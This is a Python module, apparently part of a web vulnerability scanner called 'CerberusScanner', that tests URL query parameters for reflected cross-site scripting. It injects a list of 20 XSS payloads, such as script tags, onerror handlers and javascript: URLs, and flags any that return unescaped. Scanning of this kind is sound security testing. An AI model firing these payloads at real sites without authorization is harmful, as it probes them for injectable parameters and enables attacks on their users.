
import requests
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from typing import List
import html

HEADERS = {"User-Agent": "CerberusScanner/1.0"}

# 20 varied XSS payloads (reflected)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"/><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<math><mi href=javascript:alert(1)>X</mi></math>",
    "<svg><script>alert(1)</script></svg>",
    "<img src=1 onerror=\"this.onerror=null;alert(1)\">",
    "<video><source onerror=alert(1)></video>",
    "';alert(1);//",
    "<input autofocus onfocus=alert(1)>",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<object data='javascript:alert(1)'></object>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<form action=javascript:alert(1)><input></form>",
    "\" onmouseover=alert(1) x=\""
]

def _inject_param(url, param, value):
    parsed = urlparse(url)
    qs = dict(parse_qsl(parsed.query, keep_blank_values=True))
    qs[param] = value
    new_qs = urlencode(qs, doseq=True)
    new_parsed = parsed._replace(query=new_qs)
    return urlunparse(new_parsed)

def _is_reflected(response_text: str, payload: str) -> bool:
    # naive check: payload appears verbatim in response body (unescaped)
    if payload in response_text:
        return True
    # sometimes payload is HTML-escaped; check unescaped payload presence
    if html.escape(payload) in response_text:
        # escaped presence means probably not exploitable (reflected but escaped)
        return False
    return False

def check_xss(target_url: str) -> dict:
    """
    Scans URL parameters for reflected XSS.
    Returns:
    {
        "xss": True/False,
        "findings": [ {param, payload, evidence, url}, ... ]
    }
    """
    parsed = urlparse(target_url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    results = {"xss": False, "findings": []}

    if not params:
        return results

    try:
        baseline = requests.get(target_url, headers=HEADERS, timeout=8).text
    except Exception as e:
        results["error"] = f"Baseline fetch failed: {e}"
        return results

    for param in params.keys():
        for payload in XSS_PAYLOADS:
            inj_url = _inject_param(target_url, param, payload)
            try:
                r = requests.get(inj_url, headers=HEADERS, timeout=8, allow_redirects=True)
                if _is_reflected(r.text, payload):
                    results["xss"] = True
                    results["findings"].append({
                        "param": param,
                        "payload": payload,
                        "evidence": "payload reflected in response",
                        "url": inj_url,
                        "status_code": r.status_code
                    })
                    # do not break — continue to collect multiple payload evidence
            except Exception as e:
                # keep going on errors; optionally log
                continue

    return results
